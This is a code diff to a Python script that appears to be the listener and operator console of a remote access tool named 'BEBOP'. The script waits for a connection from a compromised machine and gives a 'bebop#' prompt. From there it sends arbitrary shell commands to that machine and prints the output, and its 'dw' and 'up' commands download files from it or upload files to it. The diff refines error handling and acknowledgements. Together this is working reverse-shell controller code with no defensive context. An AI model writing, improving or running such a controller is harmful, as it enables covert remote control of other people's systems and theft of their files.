@@ -4,7 +4,7 @@ import threading
 import time
 import os
 
-address = ("0.0.0.0", 5000)
+address = ("0.0.0.0", 3000)
 
 def print_menu():
     print("\n/-------BEBOP-------/\n")
@@ -36,21 +36,27 @@ def upload_file(file_name):
         with open(f"{file_name}", "rb") as file:
             file_data = file.read()
             send(file_data)
-
-    except FileNotFoundError:
-        print("Could not find file. Make sure file is in the same directory as this script.")
+            
+        done = recv().decode()
+        print(done)
+    except OSError as e:
+        print(e)
         send(b'')
 
-def download_file(file_name, file_path=os.getcwd()):
+def download_file(file_name):
     file_data = recv()
     if not file_data:
-        print("Could not download file.")
+        print("Could not download file...")
         return
-
-    file = open(f"{file_path}{os.path.sep}{file_name}", "wb")
-    file.write(file_data)
-    file.close()
-
+        
+    try:
+        file = open(f"{file_name}", "wb")
+        file.write(file_data)
+        file.close()
+        send(b"DONE")
+    except OSError as e:
+        print(e)
+        
 def open_shell():
     while True:
         cmd = input("bebop#: ")
@@ -58,26 +64,29 @@ def open_shell():
         if cmd == "exit":
             send(cmd.encode())
             break
+            
         elif cmd[:2] == "dw":
             #Download
             print("Downloading...")
             send(cmd.encode())
+            
             file_name = cmd[3:]
             download_file(file_name)
-            continue
-
+            
         elif cmd[:2] == "up":
             #Upload
             print("Uploading...")
             send(cmd.encode())
             file_name = cmd[3:]
             upload_file(file_name)
-            continue
-
-        send(cmd.encode())
-        output = recv()
-        if output:
-            print(output.decode())
+            
+            
+        elif cmd:
+            send(cmd.encode())
+            output = recv()
+            
+            if output:
+                print(output.decode())
 
 
 def establish_connection(address):
